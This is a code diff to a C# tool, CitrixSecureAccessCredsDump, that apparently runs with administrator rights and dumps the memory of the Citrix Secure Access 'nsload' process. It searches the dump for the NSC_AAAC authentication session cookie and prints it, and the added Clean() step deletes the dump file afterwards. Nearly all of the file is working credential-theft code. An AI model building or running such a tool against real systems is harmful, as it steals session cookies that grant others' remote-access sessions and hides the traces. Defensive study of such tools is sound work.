@@ -12,7 +12,7 @@ using System.Text.RegularExpressions;
 namespace CitrixSecureAccessCredsDump
 {
     class Program
-    {
+    {     // minidump ref https://github.com/3xpl01tc0d3r/Minidump
         // This is for reference.
         public static class MINIDUMP_TYPE
         {
@@ -32,12 +32,12 @@ namespace CitrixSecureAccessCredsDump
             public const int MiniDumpWithThreadInfo = 0x00001000;
             public const int MiniDumpWithCodeSegs = 0x00002000;
         }
-       
+
 
         [DllImport("dbghelp.dll", SetLastError = true)]
         static extern bool MiniDumpWriteDump(IntPtr hProcess, uint processId, SafeHandle hFile, uint dumpType, IntPtr expParam, IntPtr userStreamParam, IntPtr callbackParam);
 
-       public static int Search(byte[] src, byte[] pattern, int start)
+        public static int Search(byte[] src, byte[] pattern, int start)
         {
             int maxFirstCharSlot = src.Length - pattern.Length + 1;
             for (int i = start; i < maxFirstCharSlot; i++)
@@ -55,10 +55,10 @@ namespace CitrixSecureAccessCredsDump
             return -1;
         }
 
+        [Obsolete] // but we don't care
         static void Main(string[] args)
         {
-
-            WindowsIdentity identity = WindowsIdentity.GetCurrent();   
+            WindowsIdentity identity = WindowsIdentity.GetCurrent();
             WindowsPrincipal principal = new WindowsPrincipal(identity);
             if (principal.IsInRole(WindowsBuiltInRole.Administrator))
             {
@@ -70,7 +70,7 @@ namespace CitrixSecureAccessCredsDump
             }
 
             Process[] process = Process.GetProcessesByName("nsload");
-     
+
             if (process.Length > 0)
             {
                 for (int i = 0; i < process.Length; i++)
@@ -78,18 +78,19 @@ namespace CitrixSecureAccessCredsDump
                     Console.WriteLine($"[+] Dumping {process[i].ProcessName} process");
                     Console.WriteLine($"[+] {process[i].ProcessName} process handler {process[i].Handle}");
                     Console.WriteLine($"[+] {process[i].ProcessName} process id {process[i].Id}");
-                    dump(process[i].Handle, (uint)process[i].Id, process[i].ProcessName);
+                    Dump(process[i].Handle, (uint)process[i].Id, process[i].ProcessName);
                 }
             }
             else
             {
                 Console.WriteLine($"[+] process is not running.");
             }
-
+            Console.WriteLine($"\nPress any key to exit.");
             Console.ReadKey();
         }
 
-        public static void dump(IntPtr processhandle, uint processId, string processname)
+        [Obsolete] //but working :)
+        private static void Dump(IntPtr processhandle, uint processId, string processname)
         {
             try
             {
@@ -103,7 +104,7 @@ namespace CitrixSecureAccessCredsDump
                 if (status)
                 {
                     Console.WriteLine($"[+] {processname} process dumped successfully and saved at {Directory.GetCurrentDirectory()}\\{filename}");
-                    extractAuthCookie(filename);
+                    ExtractAuthCookie(filename);
                 }
                 else
                 {
@@ -117,10 +118,10 @@ namespace CitrixSecureAccessCredsDump
                 Console.WriteLine(ex.Message);
             }
         }
-    public static void extractAuthCookie(string dumpPath)
+        private static void ExtractAuthCookie(string dumpPath)
         {
             //cookie is 65 alph char long 65e1eea386a61ff6beb47baac90ed6fd03d7211cb45525d5f4f58455e445a4a42 
-            Console.WriteLine($"[+] Parsing dump...");
+            Console.WriteLine($"[+] Parcessing dump...");
             byte[] fileContent = File.ReadAllBytes(dumpPath);
             byte[] bytes = Encoding.ASCII.GetBytes("NSC_AAAC=");
             string pattern = @"[a-z0-9]{65}";
@@ -131,18 +132,36 @@ namespace CitrixSecureAccessCredsDump
             {
                 var newArr = fileContent.Skip(start + 9).Take(65).ToArray();
                 string s = Encoding.UTF8.GetString(newArr, 0, newArr.Length);
-                //   Console.WriteLine(s);
+
                 start = Search(fileContent, bytes, start + 9);
                 if (rg.Match(s).Success)
                 {
                     Console.WriteLine($"[+] Auth Cookie found : NSC_AAAC={s}");
                     break;
                 }
+                else
+                {
+                    Console.WriteLine($"[+] Occurence {i} of NSC_AAAC doesn't look valid, checking next.");
+                }
                 if (start == -1)
                 {
                     Console.WriteLine($"[-] Nothing found.");
                     break;
                 }
+            }
+            Clean(dumpPath);
+        }
+
+        private static void Clean(string dumpPath)
+        {
+            try
+            {
+                Console.WriteLine($"[+] Cleaning created file.");
+                File.Delete(dumpPath);
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine($"[-] Something went wrong when deleting {dumpPath}. {e.Message}");
             }
         }
     }
